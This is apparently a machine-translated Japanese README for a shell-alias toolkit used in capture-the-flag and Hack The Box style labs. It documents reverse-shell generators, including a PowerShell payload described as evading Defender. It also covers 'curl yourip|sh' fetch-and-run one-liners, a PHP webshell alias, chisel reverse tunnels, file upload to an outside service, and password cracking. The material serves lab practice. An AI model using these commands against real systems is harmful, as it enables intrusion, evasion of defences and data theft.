# CTF、HTB、THMなどのためのツール
よく使うエイリアスやスクリプトを含みます。このリポジトリを**ホームフォルダに**クローンし、`echo "source ~/zsh-aliases/aliases.zsh" >> ~/.zshrc`を実行してください。zshを再起動すると、すべてのエイリアスとスクリプトを使えるようになります。Kali Linuxでのみテスト済みで、他のディストリビューションでは追加の依存関係をインストールする必要があるかもしれません。
> #### 免責事項
> これらのエイリアスの多くはおそらくイマイチです。pepeganessを減らすプルリクエストは歓迎します。私にとっては動けば十分なので今のところこれで使っています :D
## 雑多
### > www

現在のディレクトリでポート80のHTTPサーバーを起動します。また、各NICに関連付けられたIPアドレスのリストを表示し、現在のディレクトリのパスとファイル一覧を表示します。
例:
```
┌──(jazz㉿kali)-[/tmp/www]
└─$ www
[eth0] 192.168.172.128
[/tmp/www]
linpeas.sh  pspy64
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
> #### 注意事項
> - ポート80でリッスンできるようにsudoを使用しています

### > tun0

tun0インターフェースのIPアドレスをクリップボードにコピーします。  
例: 
```
┌──(jazz㉿kali)-[~/jazz]
└─$ tun0 
```
クリップボードの内容：
```
10.10.14.41
```

### > mkdir_cd
ディレクトリを作成した後、すぐにその中に `cd` したいことがよくあります。これがまさにそれを行います。  
例: 
```
┌──(jazz㉿kali)-[~/jazz]
└─$ mkdir_cd pepega

┌──(jazz㉿kali)-[~/jazz/pepega]
└─$ 
```

## リバースシェル
### > gen_lin_rev $ip $port 
[RSaaS](https://github.com/lukechilds/reverse-shell)をベースにしています。現在のディレクトリに`index.html`というファイルを作成します。このファイルには複数のリバースシェルペイロードが含まれており、動作するまで順番に試されます。RCE獲得後にリバースシェルを起動するのを非常に簡単かつ高速にするために`www`と一緒に使用できます。ターゲットに`curl yourip|sh`を実行させるだけで、あなたのウェブサーバーからリバースシェルペイロードを取得し、リスナーに接続できることを期待します。 
例: 
```
┌──(jazz㉿kali)-[~]
└─$ gen_lin_rev 127.0.0.1 1337
[+] Wrote Linux reverse shells to /home/jazz/index.html
```
> #### 注意事項
> - `curl yourip|sh` ペイロードは、スペースやパイプ以外に悪い文字がほとんど含まれていない点が非常に気に入っています。スペースが問題になる場合は[回避方法](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions#bypass-forbidden-spaces)があり、パイプは別々にダウンロードして実行することで回避可能です。
> - リモートマシンにcurlがインストールされていない場合は、`wget yourip -O-|sh` を試すことができます。
 
### > gen_php_rev $ip $port

指定したIPとポートで[PentestMonkey PHPリバースシェル](https://github.com/pentestmonkey/php-reverse-shell)を生成し、カレントディレクトリに保存します。  
例:

```
┌──(jazz㉿kali)-[~]
└─$ gen_php_rev 127.0.0.1 1337                                                              
[+] Wrote PHP reverse shell to /home/jazz/jazz.php
```
### > gen_ps_rev $ip $port
指定されたIPとポートを使用してPowershellリバースシェルを生成します。最後に使用した時点でDefenderを回避していました。このペイロードのクレジットを誰に与えるべきかは不明です。 
例：
```
┌──(jazz㉿kali)-[~]
└─$ gen_ps_rev 127.0.0.1 1337
```
クリップボードの内容:
```
powershell -ec JABUAGEAcgBnAGUAdABIAG8AcwB0A...
```

## TTYのアップグレード
### > uptty
python(2)およびpython3のttyアップグレードコマンドをクリップボードにコピーします。 
例: 
```
┌──(jazz㉿kali)-[~/jazz]
└─$ uptty
```
クリップボードの内容：
```
python3 -c 'import pty;pty.spawn("/bin/bash")';python -c 'import pty;pty.spawn("/bin/bash")'
```
> #### 注意事項
> - `xclip` のインストールが必要です
> - `py_tty_upgrade` と `py3_tty_upgrade` は現在も含まれていますが、代わりにこのエイリアスを呼び出します

### > script_tty_upgrade
リモートマシンにPythonがインストールされていない場合、このコマンドを使ってttyシェルにアップグレードする `script` メソッドをクリップボードにコピーできます。
例:
```
┌──(jazz㉿kali)-[~/jazz]
└─$ script_tty_upgrade
```
クリップボードの内容：
```
/usr/bin/script -qc /bin/bash /dev/null
```
> #### 注意事項
> - `xclip` のインストールが必要です

### > tty_fix
上記のいずれかの tty アップグレードを使用した後に、`stty raw -echo; fg; reset` を実行してください。

### > tty_conf
現在の tty 設定（行数と列数）を取得し、その設定を逆シェルウィンドウに直接貼り付けて一致させるためのワンライナーをクリップボードにコピーします。これにより、ターミナル内で行の折り返しが途中で発生する問題が解決されます。
例:
```
┌──(jazz㉿kali)-[~/jazz]
└─$ tty_conf               
```
クリップボードの内容:
```
stty rows 30 columns 116
```
> #### 注意事項
> - `xclip`のインストールが必要です

## ハッシュクラッキング
### > rock_john $hash_file (追加引数)
`--wordlist=/usr/share/wordlists/rockyou.txt`のように手動でrockyouを引数として指定する代わりに（オートコンプリートなし :/）、このエイリアスはその引数を注入するため、JohnTheRipperとrockyouワードリストを使ってハッシュをより簡単にクラックするために使用できます。 
例：
```
┌──(jazz㉿kali)-[~/jazz]
└─$ rock_john hash.txt --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
jazz             (?)     
1g 0:00:00:00 DONE (2022-05-19 15:59) 100.0g/s 5376Kp/s 5376Kc/s 5376KC/s lynn88..ilovebrooke
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```
> #### ノート
> - Kali は 2022.2 で John の自動補完を修正したようです！とはいえ、このエイリアスはまだ少し手間を省けます ;)
## ポートスキャン
### > nmap_tcp $ip (追加引数)
デフォルト設定で TCP nmap スキャンを開始し、スキャン結果を nmap ディレクトリに出力します。このディレクトリは存在しない場合は自動的に作成されます。
例:
```
┌──(jazz㉿kali)-[~]
└─$ nmap_default 127.0.0.1
[i] Creating /home/jazz/nmap...
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-19 16:04 EDT
...
```
> #### 注意事項
> - これはデフォルトのTCPポートのみをスキャンします。すべてのポートをスキャンするには `-p-` を引数として追加してください。
> - SYNスキャンに必要な権限を得るために `sudo` を使用します
### > nmap_udp $ip (追加引数)
私のデフォルト設定でUDPのnmapスキャンを開始し、スキャン結果をnmapディレクトリに出力します。このディレクトリは存在しない場合に自動的に作成されます。
例:
```
┌──(jazz㉿kali)-[~]
└─$ nmap_udp 127.0.0.1
[i] Creating /home/jazz/nmap...
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-19 16:11 EDT
...
```
> #### 注意事項  
> - これはデフォルトのUDPポートのみをスキャンします。すべてのポートをスキャンするには `-p-` を引数として追加してください。  
> - UDPスキャンに必要な権限を得るために `sudo` を使用します。  


## SecLists のパス

> #### 注意事項  
> - このツールキットの多くの機能は SecLists プロジェクトのワードリストを使用します。これらの機能が正しく動作するように、スクリプトは SecLists ディレクトリの場所を知る必要があります。ツールキットは以下のロジックで SecLists を検出します：  

1. まず `/opt/seclists/` が存在するか確認します。  
2. 存在しない場合は `/usr/share/seclists/` が存在するか確認します。  
3. どちらのディレクトリも存在しない場合は、`SECLISTS_PATH` という環境変数を探します。  

これらのスクリプトで SecLists を使用するための設定方法：  

1. SecLists を標準の場所のいずれか（`/opt/seclists/` または `/usr/share/seclists/`）にインストールします。  
   
   または  

2. `SECLISTS_PATH` 環境変数を SecLists のインストール先に設定します：

   ```bash
   export SECLISTS_PATH="/path/to/seclists"
   # You can add this line to your .zshrc file to make it permanent.
    ```

## Webファジング
### > vhost $domain (-w wordlist) (追加引数)
ffufを使用してバーチャルホストの検出を行います。
例：
```
┌──(22sh㉿kali)-[~]
└─$ vhost box.htb
```
> #### 注意事項
> - ドメインのみを指定した場合は http が使用されますが、https 用に https://box.htb のように完全な URL を指定することもできます
> - `ffuf` のインストールが必要です
### > fuzz_dir $url (追加引数)
ffuf を使用してディレクトリおよびファイルのファジングを実行します。
例:
```
┌──(22sh㉿kali)-[~]
└─$ fuzz_dir http://box.htb

┌──(22sh㉿kali)-[~]
└─$ fuzz_dir http://box.htb -w /path/to/custom/wordlist.txt

┌──(22sh㉿kali)-[~]
└─$ fuzz_dir http://box.htb -fs 245

┌──(22sh㉿kali)-[~]
└─$ fuzz_dir http://box.htb -w /path/to/custom/wordlist.txt -fs 245
```
> #### 注意事項
> - `ffuf` のインストールが必要です
## Chiselトンネリング
### > chisel_socks $ip $port
Chiselを使ってSOCKSプロキシを設定し、コマンドをクリップボードにコピーします。
例：

```
┌──(22sh㉿kali)-[~/jazz]
└─$ chisel_socks 10.10.14.10 8888
[+] copied chisel client -v 10.10.14.10:8888 R:socks in clipboard
2024/08/05 23:31:03 server: Reverse tunnelling enabled
2024/08/05 23:31:03 server: Fingerprint vasHkxo+4Ec2ahPgyQ8BNqQVXOCda9cmPmP7WXRdh44=
2024/08/05 23:31:03 server: Listening on http://0.0.0.0:8888
```
### > chisel_forward $local_ip $local_port $remote_ip $remote_port
Chiselを使用してポートフォワーディングを設定します。
例：

```
┌──(22sh㉿kali)-[~/jazz]
└─$ chisel_forward 10.10.14.10 8080 127.0.0.1 8080
[+] Copied to clipboard: ./chisel client 10.10.14.10:8888 R:8080:127.0.0.1:8080
[+] Run this on the target machine
2024/08/05 23:32:30 server: Reverse tunnelling enabled
2024/08/05 23:32:30 server: Fingerprint x2iuHfzYVOWXL/7Gw0a6AjXhMIg8WP7AqZwlDuRasQw=
2024/08/05 23:32:30 server: Listening on http://0.0.0.0:8888
```
## ホスト管理
### > addhost $ip $hostname
/etc/hosts ファイルにエントリを追加または更新します。
例：
```
┌──(22sh㉿kali)-[~/jazz]
└─$ addhost 10.10.11.234 big.box.htb 
[+] Appended big.box.htb to existing entry for 10.10.11.234 in /etc/hosts
10.10.11.234 boss.htb big.boss.htb big.box.htb


┌──(22sh㉿kali)-[~/jazz]
└─$ addhost 10.10.11.235 newbox.htb 
[+] Added new entry: 10.10.11.235 newbox.htb to /etc/hosts
10.10.11.235 newbox.htb
```
## 追加エイリアス
- `linpeas`: LinPEASの最新バージョンをダウンロードします。
- `upload`: bashupload.comを使ってファイルをアップロードします。
- `phpcmd`: シンプルなPHPウェブシェルを作成します。
- `burl`: burpsuiteプロキシを使ったcurlコマンドです。



---

Tranlated By [Open Ai Tx](https://github.com/OpenAiTx/OpenAiTx) | Last indexed: 2026-05-07

---